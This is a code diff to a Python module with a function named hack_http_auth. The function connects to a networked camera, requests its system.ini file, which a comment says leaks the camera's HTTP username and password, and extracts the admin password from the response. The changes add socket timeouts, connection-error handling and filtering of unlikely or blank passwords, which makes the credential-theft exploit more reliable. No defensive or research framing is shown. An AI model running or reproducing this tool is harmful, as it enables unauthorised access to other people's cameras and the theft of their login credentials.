@@ -14,12 +14,18 @@ Contains:
 
 Constants defined here:
     PACKET_SIZE
+    SOCKET_TIMEOUT
+    MAX_LIKELY_PASSWORD_LEN
+    BLANK_PASSWORD
 """
 
 logger = logging.getLogger(__name__)
 logger.info(f'Library imported: {__name__}')
 
 PACKET_SIZE = 4096
+SOCKET_TIMEOUT = 4.0
+MAX_LIKELY_PASSWORD_LEN = 100
+BLANK_PASSWORD = '\x01'
 
 @decorators.debug()
 def hack_http_auth(host, port=80):
@@ -34,7 +40,14 @@ def hack_http_auth(host, port=80):
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-    sock.connect((host, port))
+    sock.setblocking(int(False))
+    sock.settimeout(SOCKET_TIMEOUT)
+
+    try:
+        sock.connect((host, port))
+    except socket.timeout as error_timeout:
+        logger.debug('Connection timed-out connecting to host')
+        return
 
     logger.debug('Requesting system.ini')
     logger.info('system.ini leaks the cameras HTTP username and password')
@@ -44,7 +57,14 @@ def hack_http_auth(host, port=80):
     data = b''
 
     while True:
-        recv_data = sock.recv(PACKET_SIZE)
+        try:
+            recv_data = sock.recv(PACKET_SIZE)
+        except ConnectionResetError as error_connection_reset:
+            logger.debug('Connection got reset requesting encoder')
+            return
+        except socket.timeout as error_timeout:
+            logger.debug('Connection timed-out requesting encoder')
+            return
 
         data += recv_data
 
@@ -85,7 +105,6 @@ def _find_auth(data):
     """
 
     flag_admin = b'admin'
-    flag_smile = b':)' # Not always present
 
     index_admin = data.find(flag_admin)
 
@@ -102,6 +121,18 @@ def _find_auth(data):
     data_segment_min = [d for d in data_segment.split(b'\x00') if d]
 
     password = data_segment_min[0].decode()
+
+    if len(password) > MAX_LIKELY_PASSWORD_LEN \
+            or '\n' in password \
+            or '\r' in password: # Unlikely a password
+        logger.debug('Found something, but it was most likely not a password!')
+
+        return
+
+    if password == BLANK_PASSWORD: # Password is 'nothing'
+        logger.debug('Password is an empty string')
+
+        password = ''
 
     logger.debug(f'Found password: {password}')
 
